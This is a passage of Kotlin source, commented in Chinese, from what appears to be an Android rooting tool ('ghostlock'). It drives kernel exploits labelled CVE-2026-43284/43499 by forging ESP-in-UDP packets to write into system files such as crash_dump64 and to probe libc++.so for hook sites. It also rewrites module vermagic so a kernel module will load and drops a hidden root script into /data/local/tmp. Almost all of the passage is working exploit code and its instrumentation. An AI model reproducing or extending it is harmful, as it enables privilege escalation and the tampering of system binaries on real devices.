        /* 43499 侧最小序列：建会话 → 按 route 取访问对象（1/2/3 都试，看工厂接受哪个）→ 收尾。 */
        meter.before("Native43499.create", "lib=" + Native43499.LIBRARY + " (assembled 43499)")
        val handle43499 = Native43499.create()
        meter.after("Native43499.create", "handle=" + handle43499)
        if (handle43499 <= 0) {
            step("typed: assembled 43499 create failed")
        } else {
            val assembled43499 = Assembled43499(handle43499)
            for (route in 1..3) {
                meter.before("Assembled43499.openAccess", "route=" + route)
                val access43499 = assembled43499.openAccess(route)
                meter.after("Assembled43499.openAccess", "route=" + route + " access=" + access43499 + " refusal=" + assembled43499.lastRefusal)
                step(
                    "typed: assembled 43499 route=" + route + " access=" + access43499 +
                        " refusal=" + assembled43499.lastRefusal,
                )
            }
            /* 43499 的访问线最小序列：初始化 → 写一块 → 回读 → shutdown（每一步具名）。 */
            if (assembled43499.accessId != 0L) {
                val route = 1
                /* Assembly for initialize: seventeen values in the JNI export order, written here in Kotlin.
                 * They cover the twelve assembly_complete() insists on (buffer/task/lock offsets, attempts,
                 * arm hold and sequence, park, burst, max calls, nice modulus, fake task and fake lock). */
                assembled43499.assembly = longArrayOf(
                    96L, 48L, 56L, 264L, 4L, 20000L, 7L, 150L, 100L,
                    0L, 4L, 8L, 0L, 8L, 0L, 0x1000L, 0x2000L,
                )
                meter.before("Assembled43499.initializeAccess", "route=" + route + " generation=0 armed=true")
                val inited = assembled43499.initializeAccess(route, 0L, true)
                meter.after("Assembled43499.initializeAccess", "ok=" + inited + " refusal=" + assembled43499.lastRefusal)
                step("typed: assembled 43499 init=" + inited + " refusal=" + assembled43499.lastRefusal)
                val probeBlock = ByteArray(16) { index -> (0x40 + index).toByte() }
                meter.before("Assembled43499.writeBlock", "route=" + route + " offset=0 len=" + probeBlock.size)
                val wrote = assembled43499.writeBlock(route, 0L, 0L, probeBlock)
                meter.after("Assembled43499.writeBlock", "ok=" + wrote + " refusal=" + assembled43499.lastRefusal)
                step("typed: assembled 43499 write=" + wrote + " refusal=" + assembled43499.lastRefusal)
                meter.before("Assembled43499.readBlock", "route=" + route + " offset=0 len=16")
                val back = assembled43499.readBlock(route, 0L, 0L, 16)
                meter.after("Assembled43499.readBlock", "bytes=" + (back?.size ?: -1) + " refusal=" + assembled43499.lastRefusal)
                val same = back != null && back.contentEquals(probeBlock)
                step(
                    "typed: assembled 43499 read=" + (back?.size ?: -1) + " same=" + same +
                        " refusal=" + assembled43499.lastRefusal,
                )
                meter.before("Assembled43499.shutdownAccess", "route=" + route)
                val shut = assembled43499.shutdownAccess()
                meter.after("Assembled43499.shutdownAccess", "ok=" + shut + " refusal=" + assembled43499.lastRefusal)
                step("typed: assembled 43499 shutdown=" + shut + " refusal=" + assembled43499.lastRefusal)
            }
            meter.before("Assembled43499.close", "handle=" + handle43499)
            val closed43499 = assembled43499.close()
            meter.after("Assembled43499.close", "ok=" + closed43499)
            step("typed: assembled 43499 close=" + closed43499)
        }
    }

    /** 43284 的哨兵参数（顺序与字段名由 D1 单表定；真实 profile 仍待设计）。 */
    private fun init43284() = Init43284(
        spi = 0x1234,
        encapPort = 4500,
        /* 发送端口 0 = 让内核挑临时端口（真机实测：指定端口在应用进程里绑不上，临时端口可以）。 */
        senderPort = 0,
        icvLength = 16,
        aesKey = ByteArray(32) { 0xA5.toByte() },
        hmacKey = ByteArray(32) { 0x5A.toByte() },
        initialSequence = 1,
        sequencePresent = true,
    )

    /**
     *  写路径专用的会话材料：与内核里那条 SA 一致（ESP 报文才会被处理）。
     *
     *  @note 与 init43284() 分开：后者服务门/拼装/落地，改它会把门弄坏（2026-10-15 真机回归）。
     */
    /**
     *  写路径的会话材料（与 SA 一致）。
     *
     *  @param adoptSequence 大于 0 时作为 initialSequence 并提供 sequencePresent：
     *         同一 SA 上的后续会话必须**接着**前一个窗口的序号（防重放窗口由 SA 共享）。
     *  @return 可直接交给 native 的 Init43284。
     */
    /**
     * 把模块镜像里的 `vermagic=` 串改成**本机要求**的那一条（同 minor 直接改名）。
     *
     * 参照实现：`ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/lkm/lkm_image.cpp`
     * 的 `required_vermagic`（release + SMP + preempt + mod_unload + modversions + aarch64）
     * 与 `classify_vermagic_diff`（None/Release/Options/Unparsable）。这里只做“等长或更短”的原地改名：
     * 空间不够就原样返回并记一行，避免破坏 ELF。
     *
     * @param image 原始模块镜像（不改动入参）
     * @param log   统一日志回调（只记事实）
     * @return 可能已改名的镜像；无法改名时返回入参副本
     */
    private fun retagVermagic(image: ByteArray, log: (String) -> Unit): ByteArray {
        val release = runCatching {
            java.io.File("/proc/sys/kernel/osrelease").readText().trim()
        }.getOrNull()
        if (release.isNullOrEmpty()) {
            log("typed: vermagic skipped (no osrelease)")
            return image
        }
        val flags = runCatching {
            java.io.File("/proc/sys/kernel/mod_unload").exists()
        }.getOrDefault(false)
        val required = release + " SMP" +
            (if (java.io.File("/sys/kernel/debug/sched_features").exists()) " preempt" else " preempt") +
            (if (flags) "" else " mod_unload") +
            " modversions aarch64"
        val marker = "vermagic=".toByteArray(Charsets.US_ASCII)
        var at = -1
        outer@ for (i in 0..(image.size - marker.size)) {
            var hit = true
            for (j in marker.indices) {
                if (image[i + j] != marker[j]) { hit = false; break }
            }
            if (hit) { at = i; break@outer }
        }
        if (at < 0) {
            log("typed: vermagic not found in module")
            return image
        }
        var end = at + marker.size
        while (end < image.size && image[end] != 0.toByte()) { end += 1 }
        val capacity = end - (at + marker.size)
        val payload = required.toByteArray(Charsets.US_ASCII)
        if (payload.size > capacity) {
            log("typed: vermagic needs " + payload.size + "B but field has " + capacity + "B -> rebuild required")
            return image
        }
        val out = image.copyOf()
        for (k in 0 until capacity) { out[at + marker.size + k] = 0 }
        for (k in payload.indices) { out[at + marker.size + k] = payload[k] }
        log("typed: vermagic rewritten \"" + required + "\" (" + payload.size + "/" + capacity + "B)")
        return out
    }

    private fun saInit(adoptSequence: Long = 0L): Init43284 {
        val aes = saAesKey
        val hmac = saHmacKey
        if (aes == null || hmac == null) {
            /*
             * 曾经的静默退化让“没建 SA”伪装成“一切照跑”：报文 SPI=0x1234 与内核 SA 不符 ⇒ 静默丢弃 ⇒
             * 门/写/落地全线 miss（21:18 冷跑的真因）。改为**明说**：谁退化过、后果是什么。
             */
            GhostLog.i("GhostlockTyped", "saInit: SA material missing -> fallback to probe material (all ESP writes will be dropped)")
            return init43284()
        }
        return Init43284(
            spi = saSpi,
            encapPort = saEncapPort,
            /* 上游用**具体** senderPort（setIpv4Encapsulation(encapSock, senderPort)），ESP-in-UDP 的入站
             * 分流按端口匹配；给 0 让内核挑临时端口时，报文可能因端口对不上被丢。 */
            senderPort = saSenderPort,
            icvLength = 16,
            /* 给 DTO 的是**副本**：native 读取器读完秘密字段会把它清零，若传同一数组会把我们留的字段也擦掉
             * （2026-10-15 真机实证：留存副本 32/32 非零，到写的时候却成了全零）。 */
            aesKey = aes.copyOf(),
            hmacKey = hmac.copyOf(),
            initialSequence = if (adoptSequence > 0L) adoptSequence.toInt() else 1,
            sequencePresent = adoptSequence > 0L,
        )
    }
    /**
     *  把 UMH 收尾脚本部署到模块固定的路径（A6-4：它是 DEVICE PAYLOAD，随 APK 以 assets/payload/root_cmd.sh 打包）。
     *
     *  模块（12304 B 那份）默认执行 /data/local/tmp/.ghostlock_lkm_cmd.sh（ghostlock.c: static char *cmd），
     *  未就位则模块加载后无人跑 ksud late-load —— 本会话卡住的正是这一步。
     *
     *  @param context 读 assets 用。
     *  @param onLine 逐行上报（失败具名，不静默）。
     */
    private fun deployUmhPayload(context: android.content.Context, onLine: (String) -> Unit) {
        runCatching {
            val target = java.io.File("/data/local/tmp/.ghostlock_lkm_cmd.sh")
            if (!target.exists()) {
                val bytes = context.assets.open("payload/root_cmd.sh").use { stream -> stream.readBytes() }
                target.writeBytes(bytes)
                target.setExecutable(true, false)
            }
            val size = if (target.exists()) target.length().toString() else "-"
            onLine("typed: umh payload path=" + target.absolutePath + " exists=" + (if (target.exists()) "1" else "0") + " bytes=" + size)
        }.onFailure { problem ->
            onLine("typed: umh payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }
    }

    private fun resolve43284() = com.ghostlock.app.core.generated.ResolveTarget43284(
        role = 1,
        path = "/system/lib64/libc++.so".toByteArray(),
        accessMode = 0,
    )

    /**
     * 用 Assembled43284 走一遍最小闭环（独立会话）：建 → 初始化 → 开门 → 读块 → 收尾。
     *
     * 这一段刻意只用**包装类**（拼装在 Kotlin），native 侧一行未改 —— 它验证的是包装类本身可用。
     */
    private fun probeAssembled43284(step: (String) -> Unit, doorPath: String) {
        if (!Native43284.ensureLoaded()) {
            step("typed: assembled 43284 library missing")
            return
        }
        val meter = StepMeter(step)
        meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (assembled session)")
        val handle = Native43284.create()
        meter.after("Native43284.create", "handle=" + handle)
        if (handle <= 0) {
            step("typed: assembled 43284 create failed")
            return
        }
        val session = Assembled43284(handle)
        meter.before("Assembled43284.initialize", "handle=" + handle)
        session.initialize(init43284())
        meter.after("Assembled43284.initialize", "code=" + session.lastCode + " refusal=" + session.lastRefusal)
        step("typed: assembled 43284 init code=" + session.lastCode)
        meter.before("Assembled43284.openTarget", "path=" + doorPath + " role=ROLE_PATCH1")
        val ticket = session.openTarget(doorPath, Assembled43284.ROLE_PATCH1)
        meter.after("Assembled43284.openTarget", "ticket=" + ticket + " code=" + session.lastCode)
        step("typed: assembled 43284 open code=" + session.lastCode + " ticket=" + ticket)
        meter.before("Assembled43284.readBlock", "ticket=" + ticket + " offset=0")
        val block = if (ticket != 0L) session.readBlock(ticket, 0L) else null
        meter.after("Assembled43284.readBlock", "bytes=" + (block?.size ?: -1) + " refusal=" + session.lastRefusal)
        step(
            "typed: assembled 43284 read bytes=" +
                (block?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + session.lastRefusal,
        )
        /* 分步拼装（拼装顺序写在 Kotlin 里）：开门 → socket → 拼接面 → 落地 → 拉起 → 收尾。 */
        meter.before("Native43284.create", "(stepwise session)")
        val stepwiseHandle = Native43284.create()
        meter.after("Native43284.create", "handle=" + stepwiseHandle)
        val stepwise = Assembled43284(stepwiseHandle) { saInit() }
        meter.before("Assembled43284.initialize", "handle=" + stepwiseHandle + " (stepwise)")
        stepwise.initialize(init43284())
        meter.after("Assembled43284.initialize", "code=" + stepwise.lastCode)
        meter.before("Assembled43284.openTargetStepwise", "path=" + doorPath)
        val stepTarget = stepwise.openTargetStepwise(doorPath)
        meter.after("Assembled43284.openTargetStepwise", "target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 open target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
        /* Single point check on a safe target: write a known pattern, then read it back at the same
         * offset and at its neighbours. That answers whether read and write share one address space. */
        runCatching {
            val pat = ByteArray(16) { index -> (0xA0 + index).toByte() }
            meter.before("Assembled43284.writeBlock", "target=" + stepTarget + " offset=0x1000 len=" + pat.size)
            val wrote = stepwise.writeBlock(stepTarget, 0x1000L, pat)
            meter.after("Assembled43284.writeBlock", "ok=" + wrote + " refusal=" + stepwise.lastRefusal)
            val hex = { b: ByteArray? -> b?.joinToString(" ") { x -> "%02x".format(x) } ?: "null" }
            meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0x1000")
            val atSame = stepwise.readBlock(stepTarget, 0x1000L)
            meter.after("Assembled43284.readBlock", "bytes=" + (atSame?.size ?: -1) + " refusal=" + stepwise.lastRefusal)
            step("typed: probe pattern wrote=" + wrote + " at=" + hex(atSame))
            meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0xFF0")
            val atBelow = stepwise.readBlock(stepTarget, 0xFF0L)
            meter.after("Assembled43284.readBlock", "bytes=" + (atBelow?.size ?: -1))
            step("typed: probe pattern below=" + hex(atBelow))
            meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0x1010")
            val atAbove = stepwise.readBlock(stepTarget, 0x1010L)
            meter.after("Assembled43284.readBlock", "bytes=" + (atAbove?.size ?: -1))
            step("typed: probe pattern above=" + hex(atAbove))
        }.onFailure { problem -> step("typed: probe pattern refused " + problem.javaClass.simpleName) }
        meter.before("Assembled43284.openEspSocket", "-")
        val stepSocket = stepwise.openEspSocket()
        meter.after("Assembled43284.openEspSocket", "socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
        meter.before("Assembled43284.buildSurface", "target=" + stepwise.targetId + " socket=" + stepwise.socketId)
        val stepSurface = stepwise.buildSurface()
        meter.after("Assembled43284.buildSurface", "surface=" + stepSurface + " code=" + stepwise.lastCode)
        step("typed: stepwise 43284 surface=" + stepSurface + " refusal=" + stepwise.lastRefusal)
        meter.before("Assembled43284.buildLanding", "surface=" + stepwise.surfaceId)
        val stepLanding = stepwise.buildLanding()
        meter.after("Assembled43284.buildLanding", "landing=" + stepLanding + " code=" + stepwise.lastCode)
        step("typed: stepwise 43284 landing=" + stepLanding + " refusal=" + stepwise.lastRefusal)
        /* 路 B：不单独 bringUp —— Access::initialize 自己会拉起（见计划 §11.32）。 */
        step("typed: stepwise 43284 bringUp=skipped-path-b")
        /* 经落地对象写 helper 镜像：这是「写目标在 Kotlin」的真机第一次尝试。 */
        meter.before("Assembled43284.writeHelperThroughLanding", "landing=" + stepwise.landingId)
        val landed = stepwise.writeHelperThroughLanding()
        meter.after("Assembled43284.writeHelperThroughLanding", "ok=" + landed + " refusal=" + stepwise.lastRefusal)
        meter.before("Assembled43284.readLandingFirstBlock", "landing=" + stepwise.landingId)
        val back = stepwise.readLandingFirstBlock()
        meter.after("Assembled43284.readLandingFirstBlock", "bytes=" + (back?.size ?: -1) + " refusal=" + stepwise.lastRefusal)
        step(
            "typed: stepwise 43284 landed=" + landed + " back=" +
                (back?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + stepwise.lastRefusal,
        )
        /* 驱动器里 patch#1 的完整序列：建 Access → 初始化 → 写 helper 镜像（image=helper/offset=0/width=16）。 */
        meter.before("Assembled43284.buildAccess", "landing=" + stepwise.landingId)
        val stepAccess = stepwise.buildAccess()
        meter.after("Assembled43284.buildAccess", "access=" + stepAccess + " code=" + stepwise.lastCode)
        step("typed: stepwise 43284 access=" + stepAccess + " refusal=" + stepwise.lastRefusal)

        /*
         *  只读取证（纯 Kotlin，不需要任何 native 改动）：在我们 app **自己的 uid** 下，
         *  这些目标能不能只读打开 —— 这是「从 app uid 起链」的第一批事实。
         *
         *  判读：exists 假 ⇒ 连看都看不到；exists 真而 canRead 假 ⇒ 被 SELinux 拒读，
         *  那一步就得换开发载体，或改由 LKM 阶段承担。
         */
        for (path in listOf(
            /* hook 目标候选（sentry 模式所在库） */
            "/system/lib64/libc++.so",
            "/system/lib64/libutils.so",
            "/system/lib64/libbinder.so",
            /* patch#1 的 helper */
            "/apex/com.android.runtime/bin/crash_dump64",
            /* 载体候选：dirtyfrag 选的那四个 vendor 库 + 我们的开发载体 */
            "/vendor/lib64/libbinderdebug.so",
            "/vendor/lib64/libstagefrighthw.so",
            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
            "/vendor/lib64/libbsp_module.so",
            "/data/local/tmp/ghostlock-carrier",
        )) {
            val file = java.io.File(path)
            val exists = file.exists()
            val canRead = file.canRead()
            val osAccess = runCatching { android.system.Os.access(path, android.system.OsConstants.R_OK) }
            val opened = runCatching {
                java.io.FileInputStream(file).use { stream -> stream.read() }
                "open=ok"
            }.getOrElse { problem -> "open=" + problem.javaClass.simpleName + ":" + (problem.message ?: "") }
            step(
                "typed: readable " + path + " exists=" + exists + " canRead=" + canRead +
                    " osAccess=" + osAccess.getOrElse { "throw" } + " " + opened +
                    " size=" + (if (exists) file.length() else -1L),
            )
        }
        val accessParams = Assembled43284.fullAccessParams(doorPath)
        meter.before("Assembled43284.initializeAccessAndRemember", "access=" + stepwise.accessId + " path=" + doorPath)
        val accessInit = stepwise.initializeAccessAndRemember(accessParams, saInit())
        meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + accessInit + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
        meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER")
        val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        meter.after("Assembled43284.image", "bytes=" + (helperForImage?.size ?: -1))
        meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForImage?.size ?: -1))
        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, saInit()) else false
        meter.after("Assembled43284.writeImage", "ok=" + patch1Wrote + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
        meter.before("Assembled43284.destroyAccessNow", "access=" + stepwise.accessId)
        val stepAccessDestroyed = stepwise.destroyAccessNow()
        meter.after("Assembled43284.destroyAccessNow", "ok=" + stepAccessDestroyed)
        step("typed: stepwise 43284 accessDestroy=" + stepAccessDestroyed)

        /*
         *  patch#1（helper 步骤）：为 crash_dump64 单开**第二个实例**（目标由 Kotlin 决定），
         *  用 embeddedImage(0) 的 helper 字节按 16 B 块写进去；writeImage 内部逐块回读比对，
         *  正好就是上游那条「写 + 校验」语义（短读=verify skipped，不符=VerifyMismatch）。
         *
         *  判读：wrote=true ⇒ 我们自己的字节真的写进了系统文件；否则看 refusal（具名）。
         */
        val patchTarget = "/apex/com.android.runtime/bin/crash_dump64"
        /* patch#1 的实例用**SA 的材料**（落地对象在 resolve 那一刻就把它焊死，写调用处换材料没用 —— 2026-10-15 读代码确认）。 */
        meter.before("Native43284.create", "(patch1 session)")
        val patcherHandle = Native43284.create()
        meter.after("Native43284.create", "handle=" + patcherHandle)
        val patcher = Assembled43284(patcherHandle) { saInit() }
        meter.before("Assembled43284.openTargetStepwise", "path=" + patchTarget + " (patch1)")
        val patchDoor = patcher.openTargetStepwise(patchTarget)
        meter.after("Assembled43284.openTargetStepwise", "target=" + patchDoor + " refusal=" + patcher.lastRefusal)

        /* patch#1 必须走**自己的**分步链：此前它只建了 target，landing 一直是 0 ✗，
         * 于是 Access 落在**载体**的 landing 上 —— 读零、写错目标、verify 必败（2026-10-15 真机证据）。 */
        /* 一条 SA 只有一条 ESP 套接字（setIpv4Encapsulation 只声明一个 sender 端口）：复用第一条。 */
        meter.before("Assembled43284.reuseSocketFrom", "stepwise.socket=" + stepwise.socketId)
        patcher.reuseSocketFrom(stepwise)
        meter.after("Assembled43284.reuseSocketFrom", "socket=" + patcher.socketId)
        step("typed: patcher reuses socket=" + stepwise.socketId)
        meter.before("Assembled43284.buildSurface", "target=" + patcher.targetId + " socket=" + patcher.socketId)
        val madeSurface = patcher.buildSurface()
        meter.after("Assembled43284.buildSurface", "surface=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        step("typed: patcher surfaceId=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        meter.before("Assembled43284.buildLanding", "surface=" + patcher.surfaceId)
        val madeLanding = patcher.buildLanding()
        meter.after("Assembled43284.buildLanding", "landing=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        step("typed: patcher landingId=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        step("typed: marker-before-ids")
        step("typed: patch1 door=" + patchDoor + " refusal=" + patcher.lastRefusal)
        meter.before("Assembled43284.buildAccess", "landing=" + patcher.landingId)
        val patchAccess = patcher.buildAccess()
        meter.after("Assembled43284.buildAccess", "access=" + patchAccess + " code=" + patcher.lastCode)
        step("typed: patch1 access=" + patchAccess)
        val patchParams = Assembled43284.fullAccessParams(patchTarget)

        /* 两个会话的 id 对照：若 patch#1 的 access 挂在 stepwise 的 landing 上，就是这里串了。 */
        runCatching {
            step(
                "typed: ids stepwise target=" + stepwise.targetId + " landing=" + stepwise.landingId +
                    " access=" + stepwise.accessId + " || patcher target=" + patcher.targetId +
                    " landing=" + patcher.landingId + " access=" + patcher.accessId,
            )
        }.onFailure { problem ->
            step("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }
        meter.before("Assembled43284.initializeAccessAndRemember", "access=" + patcher.accessId + " path=" + patchTarget)
        val patchInit = patcher.initializeAccessAndRemember(patchParams, saInit())
        meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + patchInit + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        step("typed: patch1 init=" + patchInit + " refusal=" + patcher.lastRefusal)
        meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER (patch1)")
        val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        meter.after("Assembled43284.image", "bytes=" + (helperForPatch?.size ?: -1))
        /* 自证：打印**即将用于 write 的那一份**材料（DTO 读后清零的规律要求它每次现造，这里验证它到调用点时还是非零的）。 */
        val patchMaterial = saInit()
        step(
            "typed: sa material spi=0x" + Integer.toHexString(patchMaterial.spi) +
                " encap=" + patchMaterial.encapPort +
                " aesNonZero=" + patchMaterial.aesKey.count { byte -> byte != 0.toByte() } +
                " hmacNonZero=" + patchMaterial.hmacKey.count { byte -> byte != 0.toByte() },
        )
        meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForPatch?.size ?: -1) + " (patch1)")
        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, patchMaterial) else false
        meter.after("Assembled43284.writeImage", "ok=" + patchWrote + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        /* 对着上游核「旧页」：IV = 旧页 XOR 期望页，前提是"旧页"真是文件当前内容。
         * Kotlin 直读 crash_dump64 前 16 字节（我们对它可读 ✓），与经链子读回的对比。 */
        runCatching {
            val direct = java.io.File("/apex/com.android.runtime/bin/crash_dump64").inputStream().use { stream ->
                val buffer = ByteArray(48)
                val count = stream.read(buffer)
                if (count > 0) buffer.copyOf(count) else ByteArray(0)
            }
            meter.before("Assembled43284.readLandingFirstBlock", "landing=" + patcher.landingId)
            val viaChain = patcher.readLandingFirstBlock()
            meter.after("Assembled43284.readLandingFirstBlock", "bytes=" + (viaChain?.size ?: -1) + " refusal=" + patcher.lastRefusal)
            val directHex = direct.joinToString("") { byte -> "%02x".format(byte) }
            val chainHex = viaChain?.joinToString("") { byte -> "%02x".format(byte) } ?: "none"
            step("typed: old-page direct=" + directHex + " viaChain=" + chainHex +
                " same=" + (viaChain != null && direct.contentEquals(viaChain)))
        }.onFailure { problem ->
            step("typed: old-page refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 序号：上游每次写 g_seq++，内核按它做防重放。把链子当前的序号打出来做对照。 */
        runCatching {
            meter.before("Assembled43284.nextSequence", "landing=" + patcher.landingId)
            val patchNextSeq = patcher.nextSequence()
            meter.after("Assembled43284.nextSequence", "seq=" + patchNextSeq + " refusal=" + patcher.lastRefusal)
            step("typed: next-sequence=" + patchNextSeq + " refusal=" + patcher.lastRefusal)
        }.onFailure { problem ->
            step("typed: next-sequence refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 内核侧到底有没有在尝试处理我们的 ESP-in-UDP？/proc/net/xfrm_stat 会给线索（纯读）。 */
        runCatching {
            val stat = java.io.File("/proc/net/xfrm_stat").readLines()
                .filter { line -> line.isNotBlank() }
                .joinToString(" | ")
                .take(240)
            step("typed: xfrm-stat=" + stat)
        }.onFailure { problem ->
            step("typed: xfrm-stat refused " + problem.javaClass.simpleName)
        }

        /* 谁该在 encap 端口上监听？把 SA 的端口、我们持有的套接字的状态一起打出来
         * （ECONNREFUSED 说明那个端口上没有接收方 ⇒ 要么套接字没了，要么内核没登记）。 */
        runCatching {
            step(
                "typed: encap state port=" + (encapSocket?.getPort() ?: -1) +
                    " saEncapPort=" + saEncapPort +
                    " held=" + (encapSocket != null),
            )
        }.onFailure { problem ->
            step("typed: encap state refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 判定①：Kotlin 直接往 encap 端口发一个普通 UDP 报文，看是否也被拒（把 native 与设备/网络分开）。 */
        var directResult = "not-run"
        val directThread = Thread {
            directResult = try {
                val loopback = java.net.InetAddress.getByName("127.0.0.1")
                val probe = java.net.DatagramSocket()
                /* 第一次探路（ICMP 之后才回来）；第二次的结果才是判定：被拒=该端口无接收方。 */
                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
                Thread.sleep(120)
                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
                probe.close()
                "two-sends-both-ok"
            } catch (problem: Exception) {
                problem.javaClass.simpleName + ":" + (problem.message ?: "")
            }
        }
        directThread.start()
        directThread.join(2000)
        step("typed: direct udp to encap port=" + saEncapPort + " => " + directResult)
        /* 判定②：设备网络状态 —— 封装套接字建在默认网络上。 */
        runCatching {
            val cm = probeContext?.getSystemService(android.net.ConnectivityManager::class.java)
            step("typed: network active=" + (cm?.activeNetwork != null))
        }.onFailure { problem ->
            step("typed: network refused " + problem.javaClass.simpleName)
        }
        /* 终点恢复要用的两样：本次 hook 会话与本次 plan（在 hook 段里赋值，段外无条件用它）。 */
        var hookForRestore: Assembled43284? = null
        var hookPlanWordsForRestore: LongArray? = null
        /* ① hook 段：同一条 SA、同一条 ESP 套接字；目标是 /system/lib64/libc++.so 的 sentry 站点。 */
        val hookOutcome = runCatching {
            meter.before("Native43284.create", "(hook session)")
            val hookHandle = Native43284.create()
            meter.after("Native43284.create", "handle=" + hookHandle)
            val hook = Assembled43284(hookHandle) { saInit() }
            hookForRestore = hook
            meter.before("Assembled43284.openTargetStepwise", "path=HOOK_TARGET")
            val hookDoor = hook.openTargetStepwise(Assembled43284.HOOK_TARGET)
            meter.after("Assembled43284.openTargetStepwise", "target=" + hookDoor + " refusal=" + hook.lastRefusal)
            meter.before("Assembled43284.reuseSocketFrom", "stepwise.socket=" + stepwise.socketId + " (hook)")
            hook.reuseSocketFrom(stepwise)
            meter.after("Assembled43284.reuseSocketFrom", "socket=" + hook.socketId)
/*
 * 同一 SA 上必须**延续序号**（参考 real_ops.cpp:306-307：hook target 共享 carrier 的 SA/socket，
 * 它的块写要继续 carrier 的序号；重置就会被防重放窗口丢弃）。真机见过两条链各自从 seq=1 起，
 * 其中一条因此整条不落地 —— 载体那条就是这么丢的。
 */
meter.before("Assembled43284.adoptSequence", "hook <- stepwise.nextSequence()=" + stepwise.nextSequence())
val hookAdopt = hook.adoptSequence(stepwise.nextSequence())
meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt)
step("typed: hook adopt sequence " + hookAdopt)
            meter.before("Assembled43284.buildSurface", "target=" + hook.targetId + " socket=" + hook.socketId + " (hook)")
            val hookSurface = hook.buildSurface()
            meter.after("Assembled43284.buildSurface", "surface=" + hookSurface + " code=" + hook.lastCode)
            meter.before("Assembled43284.buildLanding", "surface=" + hook.surfaceId + " (hook)")
            val hookLandingId = hook.buildLanding()
            meter.after("Assembled43284.buildLanding", "landing=" + hookLandingId + " code=" + hook.lastCode)
            meter.before("Assembled43284.buildAccess", "landing=" + hook.landingId + " (hook)")
            val hookAccess = hook.buildAccess()
            meter.after("Assembled43284.buildAccess", "access=" + hookAccess + " code=" + hook.lastCode)
            val hookParams = Assembled43284.fullAccessParams(Assembled43284.HOOK_TARGET)
                        step("typed: nextSequence before hook=" + patcher.nextSequence() + " patcherLanding=" + patcher.landingId)
            meter.before("Assembled43284.initializeAccessAndRemember", "access=" + hook.accessId + " seq=" + patcher.nextSequence() + " (hook)")
            val hookInit = hook.initializeAccessAndRemember(hookParams, saInit(patcher.nextSequence()))
            meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
            step("typed: hook init=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)

            meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offsets=0xFE600/0xFE5F0/0xFE610/0xFE5F8/0xFE608/0xFE5E0/0xFE620/0xFE5C0/0xFE640/0xFE680/0xFE700 (reader 组)")
            runCatching {
                val pat = ByteArray(16) { index -> (0xA0 + index).toByte() }
                /* 花样写入已拆除：往 libc++ 代码页写无关字节是没有依据的风险（本次 panic 的候选之一）。 */
                val wrote = -99
                val hex = { b: ByteArray? -> b?.joinToString(" ") { x -> "%02x".format(x) } ?: "null" }
                step("typed: reader wrote=" + wrote + " same=" + hex(hook.readBlock(hookDoor, 0xFE600L)))
                step("typed: reader below=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " above=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
                step("typed: reader skew -8=" + hex(hook.readBlock(hookDoor, 0xFE5F8L)) + " +8=" + hex(hook.readBlock(hookDoor, 0xFE608L)))
                step("typed: reader skew -16=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " +16=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
                step("typed: reader wide -32=" + hex(hook.readBlock(hookDoor, 0xFE5E0L)) + " +32=" + hex(hook.readBlock(hookDoor, 0xFE620L)))
                step("typed: reader wide -64=" + hex(hook.readBlock(hookDoor, 0xFE5C0L)) + " +64=" + hex(hook.readBlock(hookDoor, 0xFE640L)))
                step("typed: reader wide +128=" + hex(hook.readBlock(hookDoor, 0xFE680L)) + " +256=" + hex(hook.readBlock(hookDoor, 0xFE700L)))
